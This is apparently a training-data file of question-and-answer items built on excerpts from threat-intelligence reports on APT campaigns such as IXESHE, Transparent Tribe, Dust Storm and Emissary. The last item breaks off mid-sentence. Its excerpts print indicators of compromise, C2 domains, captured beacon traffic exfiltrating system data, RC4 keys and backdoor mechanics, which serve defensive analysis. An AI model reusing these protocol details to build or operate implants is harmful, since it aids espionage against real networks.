    "instruction": "Big Headline: DEFENDING AGAINST APTS\nSufficiently motivated threat actors can penetrate even networks that use moderately advanced security measures. As such, apart from standard and relevant attack prevention measures and mechanisms such as solid patch management; endpoint and network security; firewall use; and the like, enterprises should also focus on detecting and mitigating attacks. Moreover, data loss prevention (DLP) strategies that identify the data an organization is protecting and take into account the context of data use should be employed.\nMedium Headline: local and external threat intelligence\nThreat intelligence refers to indicators that can be used to identify the tools, tactics, and procedures threat actors engaging in targeted attacks utilize. Both external and local threat intelligence is crucial for developing the ability to detect attacks early. The following are the core components of this defense strategy:\n\u2022 Enhanced visibility: Logs from endpoint, server, and network monitoring are an important and often underused resource that can be aggregated to provide a view of the activities within an organization that can be processed for anomalous behaviors that can indicate a targeted attack.\n\u2022 Integrity checks: In order to maintain persistence, malware will make modifications to the file system and registry. Monitoring such changes can indicate the presence of malware.\n\u2022 Empowering the human analyst: Humans are best positioned to identify anomalous behaviors when presented with a view of aggregated logs from across a network. This information is used in conjunction with custom alerts based on the local and external threat intelligence available.\nTechnologies available today such as Deep Discovery provide visibility, insight, and control over networks to defend against targeted threats.11 Deep Discovery uniquely detects and identifies evasive threats in real time and provides in-depth analysis and actionable intelligence to prevent, discover, and reduce risks.\n11\nMedium Headline: mitigation and cleanup strategy\nOnce an attack is identified, the cleanup strategy should focus on the following objectives:\n\u2022 Determine the attack vector and cut off communications with the C&C server.\n\u2022 Determine the scope of the compromise.\n\u2022 Assess the damage by analyzing the data and forensic artifacts available on compromised machines.\nRemediation should be applied soon afterward, which includes steps to fortify affected servers, machines, or devices into secure states, informed in part by how the compromised machines were infiltrated.\nMedium Headline: data-centric protection strategy\nThe ultimate objective of targeted attacks is to acquire sensitive data. As such, DLP strategies that focus on identifying and protecting confidential information are critical. Enhanced data protection and visibility across an enterprise provides the ability to control access to sensitive data as well as monitor and log successful and unsuccessful attempts to access it. Enhanced access control and logging capabilities allow security analysts to locate and investigate anomalies, respond to incidents, and initiate remediation strategies and damage assessment.\nBig Headline: TREND MICRO THREAT PROTECTION AGAINST IXESHE CAMPAIGN COMPONENTS\nThe following table summarizes the Trend Micro solutions for the components of the IXESHE campaign. Trend Micro recommends a comprehensive security risk management strategy that goes further than advanced protection to meet the real-time threat management requirements of dealing with targeted attacks.\nFirst-stage computer intrusions often use social engineering. Attackers custom-fit attacks to their targets.\nIXESHE attacks used custom-fit targeted emails with PDF exploits for CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, and CVE-2011-0611. These were used to drop malicious executable files that gave the attackers complete control of their targets' systems.\nThe attackers used either dynamic Domain Name System (DNS) or compromised servers hosted on networks that they previously successfully infiltrated.\n\u2022\t Possible Indicators of Compromise\nAttackers want to remain undetected as long as possible. A key characteristic of these attacks is stealth.\n\u00bb Enters networks via a specially crafted, targeted email with a malicious file attachment\n\u00bb Uses document exploits (primarily PDF exploits) to drop malware onto target systems\n\u00bb Uses malware detected as IXESHE by security companies\n\u00bb Sends a GET request to the command-and-control (C&C) server with the format: http://[C&C Server]/[ACD] [EW]S[Some Numbers].jsp?[Encrypted Base64 Blob]\n* The campaign codes we have seen so far are detailed in the Trend Micro research paper, \"IXESHE: An APT Campaign.\" The characteristics highlighted in this APT campaign quick profile reflect the results of our investigation as of May 2012.\nFirst-stage computer intrusions often use social engineering. Attackers custom-fit attacks to their targets.\nIXESHE attacks used custom-fit targeted emails with PDF exploits for CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, and CVE-2011-0611. These were used to drop malicious executable files that gave the attackers complete control of their targets' systems.\nThe attackers used either dynamic Domain Name System (DNS) or compromised servers hosted on networks that they previously successfully infiltrated.\n\u2022\t Possible Indicators of Compromise\nAttackers want to remain undetected as long as possible. A key characteristic of these attacks is stealth.\n\u00bb Enters networks via a specially crafted, targeted email with a malicious file attachment\n\u00bb Uses document exploits (primarily PDF exploits) to drop malware onto target systems\n\u00bb Uses malware detected as IXESHE by security companies\n\u00bb Sends a GET request to the command-and-control (C&C) server with the format: http://[C&C Server]/[ACD] [EW]S[Some Numbers].jsp?[Encrypted Base64 Blob]\n* The campaign codes we have seen so far are detailed in the Trend Micro research paper, \"IXESHE: An APT Campaign.\" The characteristics highlighted in this APT campaign quick profile reflect the results of our investigation as of May 2012.\nMedium Headline: TREND MICRO\u2122\nTrend Micro Incorporated (TYO: 4704; TSE: 4704), a global cloud security leader, creates a world safe for exchanging digital information with its Internet content security and threat management solutions for businesses and consumers. A pioneer in server security with over 20 years' experience, we deliver top-ranked client, server and cloud-based security that fits our customers' and partners' needs, stops new threats faster, and protects data in physical, virtualized and cloud environments. Powered by the industry-leading Trend Micro\u2122 Smart Protection Network\u2122 cloud computing security infrastructure, our products and services stop threats where they emerge\u2014from the Internet. They are supported by 1,000+ threat intelligence experts around the globe.\n\nBased on the above text, answer a question. How does the IXESHE campaign maintain stealth and persistence within compromised networks? What specific techniques do they employ?",
    "output": "The IXESHE campaign maintains stealth and persistence by using compromised servers as C&C servers, sometimes hosted on target organizations' networks after successful infiltration. This technique allows the attackers to increase their control over the victims' infrastructure while minimizing outbound C&C traffic, making detection more difficult. Additionally, the attackers use dynamic DNS services to hide their activities, confusing them with legitimate data. These techniques enable the attackers to remain undetected for extended periods, enhancing the effectiveness of their operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Background + Key findings\nTransparent Tribe, also known as PROJECTM or MYTHIC LEOPARD, is a highly prolific group whose activities can be traced as far back as 2013. In the last four years, this APT group has never taken time off. They continue to hit their targets, which typically are Indian military and government personnel.\nThis is the second of two articles written to share the results of our recent investigations into Transparent Tribe. In the previous article, we described the various Crimson RAT components and provided an overview of impacted users. Here are some of the key insights that will be described in this part:\nWe found a new Android implant used by Transparent Tribe for spying on mobile devices. It was distributed in India disguised as a porn-related app and a fake national COVID-19 tracking app.\nNew evidence confirms a link between ObliqueRAT and Transparent Tribe.\n\nQuestion: How does the Transparent Tribe APT group leverage mobile platforms for espionage, and what specific techniques do they employ to distribute their malicious Android implants?\n\nAnswer:",
    "output": "Transparent Tribe, also known as PROJECTM or MYTHIC LEOPARD, leverages mobile platforms for espionage by using a new Android implant designed for spying on mobile devices. This implant is distributed through deceptive means, disguised as a porn-related app and a fake national COVID-19 tracking app. These tactics aim to trick unsuspecting users into installing the malware, thereby allowing the APT group to gain unauthorized access to sensitive information on the targeted devices.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Operation SMN Background\nOperation SMN2 is a coordinated effort amongst leading private-industry security companies, led by Novetta. The initial focus of Operation SMN was to conduct the first industry-led interdiction effort against a sophisticated advanced threat actor group. This collaboration represents an evolution of the status quo from simple reporting of identified threats to a new methodology of coordinated interdiction. During this operation, the group performed malware removal, released detection signatures, and issued public reporting on 10/14/20143 and 10/28/2014 in order to mitigate the threat posed by the actor group. For the purposes of this document, the name \"Axiom\" will refer to this threat group.\nThis effort was initially focused on transferring the understanding generated by Novetta's malware decoder development to Microsoft, via their Coordinated Malware Eradication program, to create high fidelity signatures for the Hikit malware family. These co-developed signatures between Novetta and Microsoft were slated for inclusion in a Malicious Software Removal Tool (MSRT) release that would initially only target the Hikit malware family. Upon the initial few iterations of information sharing and signature development between Microsoft and Novetta it became clear that by leveraging additional industry partners a much larger sample set could be collected, analyzed, and acted upon. This fueled the selective expansion of the partnership into a small group of capable organizations that could contribute directly to the CME campaign.\nThe expansion of operational scope brought with it discussions of not only targeting the Hikit family of malware, but also refocusing efforts to target the entire known set of associated tools and malware capabilities. It was at this junction that the group decided on a more comprehensive course of action that would leverage the MSRT capabilities for detection and removal, as well as distribute the corpus of samples, analysis, and knowledge to the entire industry via Microsoft's Virus Information Alliance. The group saw that this was the most effective means to broadly distribute highly sensitive information to 64 trusted industry partners in 22 separate countries for their own use, and to protect their customers.\nThis chain of events enabled Operation SMN members to plan and execute a global disruption and degradation campaign, exposing a Chinese state-sponsored threat actor that has targeted and exploited individual victims and organizations worldwide. Novetta feels that the unified approach developed within Operation SMN, which united multiple perspectives and capabilities across private industry, provides the highest level of visibility and establishes the foundation necessary to effectively counter a threat of this nature. It is Novetta's hope that others within industry will embrace and adopt a similar approach in the future.\n2 http://www.novetta.com/blog/2014/10/cyber-security-coalition1/\n3 http://www.novetta.com/files/5614/1329/6232/novetta_cybersecurity_exec_summary-3.pdf\nRead the text above and answer this question: What unique methodology did Operation SMN employ to counter the sophisticated advanced threat actor group known as 'Axiom,' and how did this methodology differ from traditional threat reporting practices?",
    "output": "Operation SMN employed a unique methodology of coordinated interdiction, which marked a significant departure from traditional threat reporting practices. Instead of merely identifying and reporting threats, Operation SMN involved active measures such as malware removal, the release of detection signatures, and public reporting to mitigate the threat posed by the 'Axiom' group. This effort was spearheaded by Novetta and involved collaboration with leading private-industry security companies. By leveraging the capabilities of multiple partners, Operation SMN was able to collect, analyze, and act upon a much larger sample set, ultimately planning and executing a global disruption and degradation campaign. This unified approach combined multiple perspectives and capabilities across private industry, providing the highest level of visibility and establishing a foundation necessary to effectively counter a threat of this nature.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: MIS-TYPE HYBRID BACKDOOR (2012)\nIn 2012, Operation Dust Storm slowly migrated to a hybridized backdoor, which actually contained two entirely separate backdoors within the same binary. This backdoor would first attempt to establish an interactive shell using the Misdat base64 encoded network protocol over a raw TCP socket. If the initial communication to the first C2 failed, the backdoor would fallback to a secondary HTTP-based protocol and communicate to an alternate C2. Hybrid variants SPEAR identified were compressed with UPX version 3.03.\nSmall Headline: Volatile Evidence:\n\u2022 Will create a 32-bit Mutex based upon the MD5 hash of a unique string comprised of the volume serial number, decrypted network configuration data, encoded network configuration data, and encoded campaign identifier\n\u2022 May create a temporary user on the system named \"Lost_{Unique Identifier}\" with the password \"fuck~!@6\"{Unique Identifier}\"\n\u2022 May create the folder %System%\\{Unique Identifier} temporarily.\n\u2022 May create files in %AppData%\\{Unique Identifier} that end in \"tmp.exe\"\n\u2022 May create the files:\n\u2022 %AppData%\\{Unique Identifier}\\HOSTRURKLSR\n\u2022 Contains the results of the command \"cmd.exe /c ipconfig /all\"\n\u2022 %AppData%\\{Unique Identifier}\\NEWERSSEMP\n\u2022 Contains the results of the command \"cmd.exe /c net user {Username}\"\nFile System Modifications:\n\u2022 The backdoor will copy itself to %AppData%\\{Unique Identifier}\\msdtc.exe \u2013 where the unique identifier is the first ten characters of the MD5 hash\nMedium Headline: NETWORK-BASED INDICATORS\nThe malware will make DNS requests for the domains \"smtp.adobekr.com\" and \"mail.glkjcorp.com\" or \"auto.glkjcorp.com\". Both samples were configured to communicate first to \"smtp.adobekr.com\" using the Misdat network protocol described above over TCP port 80, 443, and 25. If a response was not received from the C2, the samples would fallback to the secondary HTTP protocol and communicate to the alternate C2 using the same TCP ports.\nPOST /index.asp HTTP/1.1\nAccept: Accept: */*, /index.asp, mail.glkjcorp.com Content-Type: application/x-www-form-urlencoded\nUser-Agent: FirefoxApp Host: mail.glkjcorp.com\nContent-Length: 334\nCache-Control: no-cache\nid=e263314342d1f1b9&type=post&stype=info&data=V2luZG93cyBYUA0KTUFMV0FSRS9j-dWNrb28vQWRta W5pc3RyYXRvcnMNCkNyZWF0ZSBVc2VyIExvc3RfZTI2MzMxI-\nFN1Y2Nlc3MuDQpDcmVhdGUgRGlyIFN1Y2Nlc3 MuDQpXcml0ZSBSZWdLZXkgRX-Jyb3IuDQpGaWxlU3lzdGVtIDogTlRGUw0KU3lzdGVtIFJ1blRpbWU6MCBkYXkwI\nGhvdXJzMTUgbWludXRlcw0KDQoNCiBDb3VudCA9IDANCk9wZW5TY01hbmFnZXIgT0suDQo=\nFigure 11: Initial S-Type Beacon\nThe initial POST request always used the static User-Agent \"FirefoxApp\" and contained operating system information, user information, the results of several permissions tests, the file system, and system uptime. If the backdoor did not receive a response, it would then try to communicate the same base64 encoded information in the URI of a GET request.\nWindows XP\n{Hostname}/{Username}/Administrators\nCreate User Lost_e26331 Success. Create Dir Success.\nWrite RegKey Error.\nFileSystem : NTFS\nSystem RunTime:0 day0 hours15 minutes\nCount = 0\nOpenScManager OK.\nFollow-on requests used the User-Agent of the default browser on the system as evidenced below.\nGET /index.asp?mmid=e263314342d1f1b9 HTTP/1.1\nAccept: */* Accept-Language: en-us User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)\nAccept-Encoding: gzip, deflate Host: mail.glkjcorp.com\nConnection: Keep-AliveOpenScManager OK.\nFigure 13: Follow-on HTTP Traffic\nThe id and mmid fields in the figures above both used the first 16 characters of the unique identifier created for the mutex. The Misdat protocol provided the attacker most of the features of a full-fledged backdoor, while the secondary protocol appeared to primarily be used as an update mechanism to load additional malware on the system.\nRead the text above and answer this question: What are the key indicators of compromise (IoCs) associated with the network-based activities of the hybrid backdoor used by Operation Dust Storm in 2012, and how does the malware handle DNS requests and communication protocols?",
    "output": "The key network-based IoCs include DNS requests for the domains 'smtp.adobekr.com' and 'mail.glkjcorp.com' or 'auto.glkjcorp.com'. The malware is configured to communicate first to 'smtp.adobekr.com' using the Misdat network protocol over TCP ports 80, 443, and 25. If a response is not received from the C2, the samples fall back to the secondary HTTP protocol and communicate to the alternate C2 using the same TCP ports. The initial POST request uses the static User-Agent 'FirefoxApp' and contains base64 encoded information about the operating system, user information, permissions tests, file system, and system uptime. If the backdoor does not receive a response, it tries to communicate the same information in the URI of a GET request.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 4.4 APTs are not limited to the United States Government       or Defense Industrial Base\nThe victim related to this report is neither a Government agency, nor an entity that would normally be associated with the Defense Industrial Base. While this report does list USG (United State Government) and DIB (Defense Industrial Base) entities as possible victims, there are many more commercial entities within the Geospatial and Telecommunication industries that appear to have been victims of this Group.  Zscaler has noted both foreign and domestic entities that have been victims of other APT incidents as well.\n12. http://www.rsa.com/summitresults\n\"  While the exploitation used in some of the crafted PDF attachments may be considered advanced, for the most part the attack is one of social-engineering. \"\n-Zscaler ThreatLabZ\nSmall Headline: Here are some arguments for \"full disclosure\" of incident information:\n\u2022 A larger community of awareness (and thus potential detection possibility), particularly if there are more organizations impacted\n\u2022 A general philosophy that information should be public and that the Government or information security community should not have secrets kept from the public\n\u2022 The public should be made aware of which organizations have been victimized so that this information and their response can be weighed before trusting them again in the future\nSmall Headline: Here are some arguments for \"responsible disclosure\" (the selective release of information to specific parties) of incident information\n\u2022 Public release will cause the attacker to alter their TTPs and possibly allow them to make changes to infected systems prior to incident response action, making detection more difficult\n\u2022 Public release of information can be viewed as attempting to garner the spotlight for financial motives versus genuine concerns about security\n\u2022 There may be law enforcement (or other) investigations that are on-going and such a release of information could compromise the investigation\nSmall Headline: Zscaler adheres to the following general principals for incident/ vulnerability disclosure:\n\u2022 Customer specific information is disclosed only to the impacted customer\n\u2022 Customer information will be redacted prior to public disclosure or disclosure to other impacted parties, stake-holders, and trusted groups within the information security community\n\u2022 Public disclosure will provide high-level indicators of compromise (such as general network behavior and malicious domains) without the release of specifics as to which organizations were impacted and is done so when it is believed that such information will benefit others in protecting against similar threats\n\u2022 Based on feedback/approval from the impacted parties, stake-holders, and information security community \u2013 additional information may be released to the public\nZscaler is willing to share additional details of the incidents discussed in this report with trusted groups within the information security community to help further their research with regard to similar incidents. If you are interested in sharing data on this and other incidents, we encourage you to contact us at threatlabz@zscaler.com.\nBig Headline: Conclusion\nBy interrogating Zscaler's comprehensive logging repository for anomalous activity and indicators of compromise, a Zscaler ThreatLabZ researcher identified a high-risk entity victimized by a possible APT attack linked to the \"1.php\" Group. The conclusion that these attacks should be classified as an APT attack are based on the following indicators:\n\u2022 The victim enterprise is a high risk target, involved in an industry that has regularly been targeted in similar attacks\n\u2022 Linkages were identified among several previous incidents from 2010 to present, showing persistence\n\u2022 There remains little to no open-source information on the domains / IPs used in the attack, and the linkage to open-source reports shows a correlation with past APT incidents\n\u2022 The RAT payload in question is popular among previously documented APT incidents\n\u2022 Some No-IP dynamic DNS domains used (while a weak APT indicator, dynamic DNS domains have often been used among documented APT incidents, such as Aurora and Night Dragon)\n\u2022 Hostnames related to victims are used, which is a technique previously documented in other APT attacks\n\u2022 Nameserver and domain registration information indicates likely Chinese origin of attacks\n\u2022 VPS/hosting servers used match some of those previously used in alleged APT attacks.\nThe sum of these indicators has led to our conclusion that this was an attack performed over a significant period of time that focused on a specific target, given the sensitive nature of their work. Based on information in the public domain, it appears that these attacks correlate with others, previously identified as being the work of the \"1.php\" Group.  Identified targets of these attacks include China/US relations experts, USG / DIB entities, and the Geospatial industry. Based on the targets, it is our belief that corporate espionage was the goal of the attacks.  Open-source reports suggest that these attacks are more widespread than many realize and that the same or similar actors are compromising numerous organizations in order to steal sensitive intellectual property. As stated within the Lessons Learned section, it is important that those concerned about such attacks be vigilant in their log collection and analysis to identify anomalies or other indications of compromise.\n\"  The sum of these indicators has led to our conclusion that this was an attack performed over a significant period of time that focused on a specific target, given the sensitive nature of their work. \"\n-Zscaler ThreatLabZ\nBig Headline: About Zscaler: The Cloud Security Company\u2122\nZscaler enforces business policy, mitigates risk and provides twice the functionality at a fraction of the cost of current solutions, utilizing a multi-tenant, globally-deployed infrastructure.  Zscaler's integrated, cloud-delivered security services include Web Security, Mobile Security, Email Security and DLP. Zscaler services enable organizations to provide the right access to the right users, from any place and on any device\u2014all while empowering the end-user with a rich Internet experience.\n\nQ: Why does Zscaler advocate for 'responsible disclosure' of incident information related to APT attacks? Explain the rationale behind this approach.",
    "output": "A: Zscaler advocates for 'responsible disclosure' of incident information related to APT attacks for several reasons. First, public release of information can alert the attacker to change their tactics, techniques, and procedures (TTPs), potentially allowing them to make changes to infected systems prior to incident response actions, thereby making detection more difficult. Second, public release of information might be perceived as an attempt to gain attention for financial motives rather than genuine security concerns. Lastly, there may be ongoing law enforcement or other investigations that could be compromised by the release of such information.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Targeting\nIn contrast to Elise, which was used in attacks against multiple Southeast Asian countries in region appropriate languages, all of the Emissary decoys we've collected are written in Traditional Chinese, which is used primarily in Taiwan and Hong Kong. The targets we have identified are also limited to those two regions. Despite appearing to target a more limited geographical range, Emissary targeted the government, higher education, and high tech companies with a mix of copy and pasted news articles and documents that do not appear to be available online. Decoys include:\nAn Excel spreadsheet containing legitimate contact information for much of the Taiwanese government that does not appear to be available online.\nCopy and paste of a news article where the Deputy Commander of the Nanjing Military region, Wang Huanguang, responds negatively to a 2014 magazine article from a respected US Taiwan scholar saying the odds of China and Taiwan reuniting is low and discussing the issues with an attempted military takeover.\nCopy of a news article from 2010 about the Chinese League of Victims protesting the involuntary removal of Shanghai residents in the lead up to the Shanghai Expo.\nCopy of the official Taiwan holiday schedule for 2016, which is the 105th anniversary of the current\nTaiwanese government.\nBig Headline: Evolve to Survive: TTP Shifts and Infrastructure\nWe've expanded our knowledge of Emissary infrastructure significantly since our first Emissary blog and we've found almost exclusive use of Dynamic DNS (DDNS) domains with only one purchased from a Chinese reseller. In contrast, the Elise samples used a mix of actor\u00adregistered and DDNS, with the actor\u00adregistered serving as one of the data points we used to tie all of the activity together. While the use of DDNS can make tying activity together more difficult, and despite the new Emissary variants since our publication, two of the most recent C2s resolved to IPs used by Elise C2s detailed in Operation Lotus Blossom. The Emissary samples typically have three hardcoded C2s that are a mix of IPs and domain names, with one of the domains or IPs not being used by the other three C2s in a likely effort to avoid loss of control. A full IOC list is included at the end of this report.\nAlso new is the actors' use of compromised legitimate Taiwanese websites to serve their malware, including the official website of the Democratic Progressive Party. This is particularly interesting as Taiwan just held a closely watched Presidential election on 16 January where DPP candidate Tsai Ing\u00adwen won. This marked the first time a woman was elected President of Taiwan and only the second time a member of the Kuomintang did not hold the office since being ousted from China in 1949 when the Communist Party of China took power. In line with her party's stance, she is widely seen as a proponent of an independent Taiwan and not in favor of reunification with the People's Republic of China.\nBig Headline: Malware Updates\nOur evidence suggests that malware authors created Emissary as early as 2009, which suggests that threat actors have relied on this tool as a payload in cyber\u00adespionage attacks for many years. The Emissary Trojan is a capable tool to gain a foothold on a targeted system. While it lacks more advanced functionality like screen capturing, it is still able to carry out most tasks desired by threat actors: exfiltration of files, ability to download and execute additional payloads, and gain remote shell access. It appears that threat actors have continually used this Trojan, and developed several updated versions of Emissary to remain undetected and fresh over time.\nWe analyzed all of the known Emissary samples to determine what changes the malware author made between the different versions of the Trojan. During our analysis, we examined when each sample was created based on its compile time and produced a simple timeline, seen in Figure 2, to display the development efforts expended on the Emissary Trojan. It should be noted that we know some Emissary samples have been used multiple times with different configurations, so the timeline only shows when development activity took place on Emissary and should not be misconstrued to when Emissary was used in attacks.\nThe timeline in Figure 2 shows that the Emissary Trojan was first created (version 1.0) in May 2009 and quickly received an update that resulted in version 1.1 in June 2009. The Trojan did not receive much in the form of updates until September 2011 when the author released version 2.0. Version 2.0 received one update in October 2013 before the malware author released version 3.0 in December 2014. The malware author released version 4.0 in March 2015, but curiously created a version 3.0 sample afterwards on June 26, 2015, which was out\u00adof\u00adsequence from the incrementing versioning. Between August and November 2015 the malware author creates several new versions of Emissary, specifically 5.0, 5.1, 5.3 and 5.4 in a much more rapid succession compared to development process in earlier versions.\nBig Headline: !Emissary D,evelopment: Com1pilation 'Times per Ver,sion\nThe out\u00adof\u00adsequence version 3.0 appears to be an early variant of version 5.0 based on significant similarities (discussed in the changelog section) that are not seen in the original version 3.0 and other earlier versions of Emissary. One campaign code associated with of the out\u00adof\u00adsequence version 3.0 sample was \"3test\", suggesting the malware author created it for testing purposes. The other campaign code associated with the out\u00adof\u00adsequence sample was \"IC00001\", which could denote an attack payload as it appears to be a plausible code to describe a campaign.\nWhile this may be coincidental, the out\u00adof\u00adsequence version 3.0 sample was created ten days after we published the paper that exposed the Elise Trojan that is closely related to Emissary. It is possible that the threat actors were prompted to make malware changes in response to our research. Regardless of causation, the rapid development of new versions of Emissary suggests that the malware authors are making frequent modifications to evade detection, which as a corollary suggests the threat actors are actively using the Emissary Trojan as a payload in attacks.\n\nAnswer this question based on the above context: What key updates and developments were made to the Emissary Trojan over its lifespan, and how did the malware authors respond to external factors such as research publications?",
    "output": "The Emissary Trojan underwent several updates and developments over its lifespan, with the earliest version created in May 2009. Notable updates included version 2.0 in September 2011, version 3.0 in December 2014, and version 4.0 in March 2015. After the publication of a paper exposing the Elise Trojan in June 2015, the malware authors created an out-of-sequence version 3.0 sample, which appeared to be an early variant of version 5.0. This rapid development suggested that the authors were making frequent modifications to evade detection and actively using the Emissary Trojan as a payload in attacks. The timeline of updates indicated a significant increase in development efforts post-publication, with versions 5.0, 5.1, 5.3, and 5.4 created in quick succession between August and November 2015.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How was CVE-2010-3333 used in the context of the APT attack against Ahmed Mansoor, and what does this reveal about the tactics and techniques of the attackers?",
    "output": "CVE-2010-3333 is a stack-based buffer overflow vulnerability in Microsoft Office that allows remote attackers to execute arbitrary code via crafted RTF data. In the context of the APT attack against Ahmed Mansoor, this vulnerability was exploited in July 2012 to deliver Hacking Team spyware to his laptop via a booby-trapped Microsoft Word document. This reveals that the attackers were using a sophisticated and multi-vector approach to target Mansoor, leveraging known vulnerabilities in software to gain access to his device. Furthermore, the use of a vulnerability that was already two years old at the time of the attack suggests that the attackers were relying on the fact that Mansoor may not have kept his software up to date, highlighting the importance of regular patching and updating. The fact that Mansoor was also targeted with other types of malware and phishing attempts in the following years suggests that the attackers were persistent and willing to try multiple approaches to achieve their goals.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: Details\nc_20100.NLS contains a ciphered block with initial settings. This ciphered block resides at the very end of the file of this malicious program and is decrypted in the beginning of execution. Structure of block:\nInitial settings in the end of file\nThe malicious program XORs the magic number with a hardcoded value 0x19860609, converts a resulted value into a HEX-string and uses that string as a key for RC4 cipher algorithm. In this case string-key represents \"00000000\" because of the magic number is equal to the hardcoded XORing value. With that key malicious program decrypts (RC4) ciphered archive. The archive has the following data:\nArchive of initial settings\nCustom LZ-like compression algorithm resembling was used to pack initial settings. After unpacking the following data appears:\nThe Initial settings\nThe malicious program tries to read registry value \"SrvCode\" by registry path:\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion. That value is expected to contain ciphered with RC4 data. To decrypt it program uses 2nd integer of initial settings (in this case 0x3514) XORed by hardcoded byte 0x12. Result is converted into a HEX-string and is used as RC4 key for further decryption (here it is \"00003506\"). That registry value appears if this malicious program had already worked on the system and received data from the C&C server in the past. Content of \"SrvCode\" poses a ciphered executable which should be loaded into the memory and run.\nIf \"SrvCode\" is not found malware makes attempts to connect to one of the specified C&C servers.\nSmall Headline: C&C Server Address Selection\nInitial settings define the type of C&C format. Byte at offset 0x24C stores the C&C type value:\n0x00: the malware uses 4 URL-based C&Cs placed at 0x4C, 0x8C, 0xCC and 0x10C offsets. By all appearances these are public resources (forums, blog platforms and so on) where the attackers leave messages with specially crafted content for a bot. If connection fails, the malware tries another approach.\n0x01: the malware uses attackers' hardcoded servers and connects to host and port specified at offsets: 0x14C, 0x18C, 0x1CC and 0x20C. If connection fails the malware tries another approach.\nIf URL-based scheme is used then malware loads a web-page by specified in settings URL. The target text has to begin and end with special hardcoded delimiters: \"B9273C17\" \u2013 start, \"B6A74634\" \u2013 end. The malware reads contents of the webpages until it finds a proper page with delimiters. If found, the malware takes the text between delimiters and treats it as data of hex string, converts it to the binary data and decrypts resulted data using RC4 algorithm with hardcoded key \"rtyr_45_trf\". For example:\n\"B9273C17E67024277AE02E2A8A780B243C0BCA88FE85A1B6A7463\",\nThe data between delimiters:\n\"E67024277AE02E2A8A780B243C0BCA88FE85A1\",\nIt is converted into binary: 0xe6 0x70 0x24 \u2026 0xa1 and this buffer is decrypted with RC4 key \"rtyr_45_trf\". Result is a host and port of C&C: \"nx2.intercpu.com:25\".\nIf the host-port schema is used then malware simply connects to the hardcoded C&C servers directly.\nVery Small Headline: 2nd block\n0x1C bytes (due to absence of real respond from the C&C I'm presenting an example buffer of this block containing bytes 0x00, 0x11, 0x22, \u2026 , 0xFF, 0x00, 0x0, 0x0, \u2026, 0x00):\n2nd block of 0x1c bytes: example\nFirst DWORD of this buffer (here, 0x33221100) is a magic number which is XORed with the value 0x1986052. Resulted lowest byte is used to XOR unpacked data.\nWord at offset 0x4 (here, 0x5544) poses a checksum of unpacked data which should correspond with actual received content.\nDWORD starting at offset 0x8 (here, 0xBBAA9988) represents a size of unpacked data.\nValue at marked place at 0xC offset (in example picture it is dword 0xFFEEDDCC) represents a size of next block of data to be received. That data will pose an archive, hence this value represents a size of packed data.\nVery Small Headline: 3rd block\nThe 3rd block poses an archive of ciphered data. Being received, unpacked and decrypted, data is ciphered again with RC4 and stored into \"SrvCode\" value of registry by mentioned above registry path.\nThe eceived data is processed as an executable file to run.  The malware places the executable in memory, prepares for running and makes call to the entry point of the new code. Then it waits when following event will be triggered:\nGlobal\\D5ACF9F6-C8B3-47d1-9768-57162E1F5FDB\nWhen triggered, the malware finishes execution. During the process of finishing it deletes registry value \"SrvCode\" along with values \"DrvCode\" and \"KeyCode\" from the same registry path although this malware was not creating them.\nSmall Headline: Tcprelay.sys File\nSize: 99912\nMD5: 0b105cd6ecdfe5724c7db52135aa47ef\nLocation: C:\\WINDOWS\\system32\\drivers\\tcprelay.sys\nCreation time (UTC): 2012-09-05 17:27:04\nLink time (UTC): 2011-12-21 13:55:03\nThis file is a Microsoft Windows native application, which is loaded as a driver and had a valid digital signature in 2012.\nThe certificate was issued by LivePlex Corp, which can be found online by searching for the company name. One of their webpages is here:\nDigital certificate of Tcprelay.sys\nLivePlex profile page on LinkedIn\nWhen the driver is loaded it decrypts an embedded DLL file, which is immediately injected into the address space of services.exe process. Then the driver sets up some rootkit functionality to hide TCP connections by patching the system tcp/ip driver.\nThe injected DLL was called s.dll at the time of compilation and is yet another module for analysis.\nSmall Headline: S.dll File\nSize: 77825\nMD5: 1716889fcee461e7cde5128c14d206cb\nLocation: inside tcprelay.sys\nCreation time (UTC): 2012-09-05 17:27:04\nLink time (UTC): 2011-03-01 09:07:12\nThis opens system event named \"401d-b49a-93cf7a18e5b3\" and sets event to fired state if it exists. The code checks for proxy server configuration by impersonating a logged in user and fetching settings from the registry. It can work both with Socks and HTTP proxies. The module attempts to connect to the list of 8 domains, consisting of the following command and control servers (some of them are used more than once):\na1.googletrait.com\na1.nexongame.net\na1.reegame.net\nmail.nexongame.net\nIt automatically looks for open C&C ports in the following order 53,443,8080,25,80,3690,1433,80.\nDuring connection over HTTP proxy it uses the following User-Agent string: \"MyApp/0\".\nThe application is linked with libmysql.dll and Zlib (v.1.2.3). Current Zlib version is 1.2.7 and was released on 2nd May 2012, while version 1.2.3 seems to be released in July 2005. Zlib version 1.2.4 was released on March 2010, so the original module was probably designed somewhere after July 2005 and before March 2010.\nThen it collects system information, which includes the following:\nHost name\nOS Service Pack version\nSystem default language ID and Code page\nList of local drives with free space\nInternal hardcoded identifier (\"12-21\")\nProcess commandline\nLogged in user name\nSystem directory path\nAmount of free system memory\nCPU name\nTerminal services port number\nThe information is stored in a buffer that begins with hardcoded header magic number: 0xDF1F1ED3. The block is compressed using Zlib (v.1.2.3) compress2 method with compression level 8. The data is compressed later and prepended by a 4-bytes header as shown below.\nFormat of a message sent to C&C\nAfter submitting system information the module expects 4 byte response code from the server after which it sends one 00 byte to complete the handshake procedure.\nThen the module expects an interactive communication session with the remote operator. It provides capability to run various commands including (command names were defined during reverse 